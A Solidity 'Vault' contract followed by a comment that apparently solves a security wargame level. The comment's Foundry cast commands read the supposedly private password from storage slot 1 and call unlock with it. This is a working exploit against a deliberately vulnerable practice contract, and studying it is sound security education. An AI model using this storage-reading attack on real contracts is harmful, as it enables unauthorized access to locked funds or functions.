// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}

/*
Instance address: 0xc7ebA42F4B0189FD5d12e089593A105A5481B7FA
source .env
export vault=0xc7ebA42F4B0189FD5d12e089593A105A5481B7FA
cast storage $vault 1 --rpc-url $RPC_URL
export password=0x412076657279207374726f6e67207365637265742070617373776f7264203a29
cast call $vault "locked()" --rpc-url $RPC_URL
cast send $vault "unlock(bytes32)" $password --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
